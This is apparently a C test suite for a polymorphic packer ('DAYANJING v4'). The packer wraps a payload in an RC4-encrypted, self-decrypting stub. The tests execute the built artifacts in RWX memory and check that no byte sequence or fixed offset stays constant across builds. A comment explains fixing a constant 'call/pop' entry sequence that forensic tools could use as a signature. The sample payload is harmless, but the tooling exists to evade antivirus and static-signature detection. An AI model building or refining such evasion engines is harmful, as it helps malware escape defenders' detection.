/*
 * DAYANJING v4 — 20_packer / tests/test_poly.c
 *
 * 多态引擎验证。要点：
 *   - 真机执行：mmap RWX，把制品当函数调用，验证存根确实解密并跳转
 *   - 独立解密：用参考 RC4 解出密文段，逐字节比对原载荷
 *   - 多态性：N 次构建的存根两两不同、长度有差异、不存在跨构建公共长串
 *   - 确定性：同种子逐字节可复现
 */

#include "poly.h"

#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <unistd.h>

/* mov eax, 0x1337; ret —— 位置无关，解密后直接可被 jmp 到并 ret 回调用方 */
static const uint8_t PAY_MAGIC[] = { 0xB8, 0x37, 0x13, 0x00, 0x00, 0xC3 };
#define PAY_MAGIC_LEN (sizeof(PAY_MAGIC))
#define EXPECT_RET    0x1337

static int g_pass = 0, g_fail = 0;

static void chk(int cond, const char *name)
{
    if (cond) { printf("[PASS] %s\n", name); g_pass++; }
    else      { printf("[FAIL] %s\n", name); g_fail++; }
}

static void info(const char *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    printf("[INFO] ");
    vprintf(fmt, ap);
    printf("\n");
    va_end(ap);
}

/* ------------------------------------------------------------------ */

typedef int (*fn_t)(void);

/* 真机执行制品：返回载荷执行后的 eax */
static int run_artifact(const uint8_t *art, size_t len)
{
    void *p = mmap(NULL, (len + 4095) & ~(size_t)4095,
                   PROT_READ | PROT_WRITE | PROT_EXEC,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (p == MAP_FAILED) return -999;
    memcpy(p, art, len);
    fn_t f = (fn_t)(uintptr_t)p;
    int r = f();
    munmap(p, (len + 4095) & ~(size_t)4095);
    return r;
}

static int has_sub(const uint8_t *hay, size_t hlen,
                   const uint8_t *needle, size_t nlen)
{
    if (nlen > hlen) return 0;
    for (size_t i = 0; i + nlen <= hlen; i++)
        if (memcmp(hay + i, needle, nlen) == 0) return 1;
    return 0;
}

/* ------------------------------------------------------------------ */

#define NBUILD 64
#define WIN    16

int main(void)
{
    setbuf(stdout, NULL);
    /* ---- 1. 参考 RC4 自洽 ---- */
    {
        uint8_t k[POLY_KEY_LEN], buf[300];
        for (int i = 0; i < (int)sizeof(k); i++) k[i] = (uint8_t)(i * 7 + 3);
        for (size_t i = 0; i < sizeof(buf); i++) buf[i] = (uint8_t)(i * 31 + 1);
        uint8_t orig[300];
        memcpy(orig, buf, sizeof(buf));
        poly_rc4(k, buf, sizeof(buf));
        chk(memcmp(buf, orig, sizeof(buf)) != 0, "RC4 加密后与原文明文不同");
        poly_rc4(k, buf, sizeof(buf));
        chk(memcmp(buf, orig, sizeof(buf)) == 0, "RC4 二次作用还原明文");
    }

    /* ---- 2. 参数校验 ---- */
    {
        poly_ctx *p = poly_new(1);
        uint8_t *o = NULL; size_t n = 0;
        chk(poly_build(NULL, PAY_MAGIC, PAY_MAGIC_LEN, &o, &n) == POLY_ERR_PARAM,
            "poly_build(NULL ctx) 拒绝");
        chk(poly_build(p, NULL, 10, &o, &n) == POLY_ERR_PARAM,
            "poly_build(NULL 载荷但长度非 0) 拒绝");
        uint8_t key[POLY_KEY_LEN];
        chk(poly_last_key(p, key) == POLY_ERR_NOBUILD, "未构建时 last_key 报 NOBUILD");
        chk(poly_new(0) != NULL, "poly_new(0) 不返回 NULL（种子 0 已扰动）");
        poly_free(p);
    }

    /* ---- 3. 确定性 / 非确定性 ---- */
    {
        poly_ctx *a = poly_new(0x1234), *b = poly_new(0x1234), *c = poly_new(0x5678);
        uint8_t *oa = NULL, *ob = NULL, *oc = NULL;
        size_t na = 0, nb = 0, nc = 0;
        poly_build(a, PAY_MAGIC, PAY_MAGIC_LEN, &oa, &na);
        poly_build(b, PAY_MAGIC, PAY_MAGIC_LEN, &ob, &nb);
        poly_build(c, PAY_MAGIC, PAY_MAGIC_LEN, &oc, &nc);
        chk(na == nb && memcmp(oa, ob, na) == 0, "同种子构建逐字节一致");
        /* 注意：不同种子的存根长度本就不同（垃圾指令条数、栈帧大小随种子变），
           因此"字节不同"只能比公共前缀，不能要求等长——长度差异本身就是多态性。 */
        size_t cmn = na < nc ? na : nc;
        chk(memcmp(oa, oc, cmn) != 0, "异种子构建字节不同（公共前缀比较）");
        free(oa); free(ob); free(oc);
        poly_free(a); poly_free(b); poly_free(c);
    }

    /* ---- 4. 批量：真机执行 + 独立解密 + 多态性 ---- */
    {
        static uint8_t  arts[NBUILD][4096];
        static size_t   alens[NBUILD];
        static size_t   slens[NBUILD], gaps[NBUILD], offs[NBUILD];
        int exec_ok = 0, dec_ok = 0;
        int distinct = 1;
        static int len_seen[NBUILD];
        int nlen_seen = 0;

        for (int i = 0; i < NBUILD; i++) {
            poly_ctx *p = poly_new((uint64_t)(0x9E3779B1ull * (uint64_t)(i + 1)));
            uint8_t *o = NULL; size_t n = 0;
            if (poly_build(p, PAY_MAGIC, PAY_MAGIC_LEN, &o, &n) != POLY_OK) {
                poly_free(p); break;
            }
            memcpy(arts[i], o, n);
            alens[i] = n;
            poly_last_span(p, &slens[i], &gaps[i], &offs[i]);

            /* 真机执行 */
            if (run_artifact(o, n) == EXPECT_RET) exec_ok++;

            /* 独立解密密文段 */
            uint8_t key[POLY_KEY_LEN];
            poly_last_key(p, key);
            uint8_t tmp[PAY_MAGIC_LEN];
            memcpy(tmp, o + offs[i], PAY_MAGIC_LEN);
            poly_rc4(key, tmp, PAY_MAGIC_LEN);
            if (memcmp(tmp, PAY_MAGIC, PAY_MAGIC_LEN) == 0) dec_ok++;

            /* 存根长度差异统计 */
            int seen = 0;
            for (int q = 0; q < nlen_seen; q++)
                if (len_seen[q] == (int)slens[i]) { seen = 1; break; }
            if (!seen) len_seen[nlen_seen++] = (int)slens[i];

            free(o);
            poly_free(p);
        }

        info("构建 %d 份：执行成功 %d，独立解密一致 %d，不同存根长度 %d",
             NBUILD, exec_ok, dec_ok, nlen_seen);

        chk(exec_ok == NBUILD, "全部制品真机执行返回 0x1337");
        chk(dec_ok == NBUILD, "全部制品密文段独立解密与原载荷一致");
        chk(nlen_seen >= 8, "存根长度具备多态性（>=8 种）");

        size_t mn = slens[0], mx = slens[0];
        for (int i = 1; i < NBUILD; i++) {
            if (slens[i] < mn) mn = slens[i];
            if (slens[i] > mx) mx = slens[i];
        }
        info("存根长度 min=%zu max=%zu 跨度=%zu", mn, mx, mx - mn);
        chk(mx - mn >= 16, "存根长度跨度 >=16 字节");

        for (int i = 0; i < NBUILD && distinct; i++)
            for (int j = i + 1; j < NBUILD; j++)
                if (slens[i] == slens[j] &&
                    memcmp(arts[i], arts[j], slens[i]) == 0) { distinct = 0; break; }
        chk(distinct, "任意两份制品的存根字节不同");

        /* 跨构建公共长串：若存在，即为可提取的静态特征 */
        int common = 0;
        for (size_t w = 0; w + WIN <= slens[0]; w++) {
            int in_all = 1;
            for (int i = 1; i < NBUILD; i++)
                if (!has_sub(arts[i], alens[i], arts[0] + w, WIN)) { in_all = 0; break; }
            if (in_all) common++;
        }
        info("跨全部 %d 份制品的公共 %d 字节窗口数 = %d", NBUILD, WIN, common);
        chk(common == 0, "不存在跨全部构建的 16 字节公共串");

        /*
         * 逐偏移熵检查 —— 上面那条 16 字节窗口检查查不出短签名，必须补这条。
         *
         * 曾经的缺陷：每一份制品的前 5 字节恒为 E8 00 00 00 00
         * （call +0 / pop 取 RIP），是一条可直接匹配入口的静态特征。
         * 16 字节窗口检查对它完全无感（窗口足够长就被后面的变异打散了），
         * 是逐字节统计 distinct 值的取证程序才把它逼出来。
         * 修复后取 RIP 有两种等价实现 + 随机多字节 NOP 前缀。
         */
        size_t mlen = slens[0];
        for (int i = 1; i < NBUILD; i++) if (slens[i] < mlen) mlen = slens[i];

        int worst_run = 0, cur_run = 0;
        for (size_t o = 0; o < mlen; o++) {
            int seen[256] = {0}, d = 0;
            for (int i = 0; i < NBUILD; i++)
                if (!seen[arts[i][o]]) { seen[arts[i][o]] = 1; d++; }
            if (d == 1) { cur_run++; if (cur_run > worst_run) worst_run = cur_run; }
            else cur_run = 0;
        }
        int entry_vals = 0;
        {
            int seen0[256] = {0};
            for (int i = 0; i < NBUILD; i++)
                if (!seen0[arts[i][0]]) { seen0[arts[i][0]] = 1; entry_vals++; }
        }
        info("逐偏移统计：最长全构建相同字节游程 = %d，入口首字节取值数 = %d",
             worst_run, entry_vals);
        chk(worst_run == 0,
            "不存在任何跨全部构建恒定的字节偏移（无短静态签名）");
        chk(entry_vals >= 3, "入口首字节具备多样性（>=3 种取值）");
    }

    /* ---- 5. 长载荷 ---- */
    {
        static uint8_t big[3000];
        memcpy(big, PAY_MAGIC, PAY_MAGIC_LEN);
        for (size_t i = PAY_MAGIC_LEN; i < sizeof(big); i++)
            big[i] = (uint8_t)(i * 17 + 5);

        poly_ctx *p = poly_new(0xABCD);
        uint8_t *o = NULL; size_t n = 0;
        chk(poly_build(p, big, sizeof(big), &o, &n) == POLY_OK, "长载荷构建成功");

        size_t sl, gp, off;
        poly_last_span(p, &sl, &gp, &off);
        uint8_t key[POLY_KEY_LEN];
        poly_last_key(p, key);
        uint8_t *tmp = (uint8_t *)malloc(sizeof(big));
        memcpy(tmp, o + off, sizeof(big));
        poly_rc4(key, tmp, sizeof(big));
        chk(memcmp(tmp, big, sizeof(big)) == 0, "长载荷密文段独立解密一致");
        chk(run_artifact(o, n) == EXPECT_RET, "长载荷制品真机执行返回 0x1337");
        free(tmp); free(o); poly_free(p);
    }

    printf("\n=== result: %d pass, %d fail ===\n", g_pass, g_fail);
    return g_fail ? 1 : 0;
}
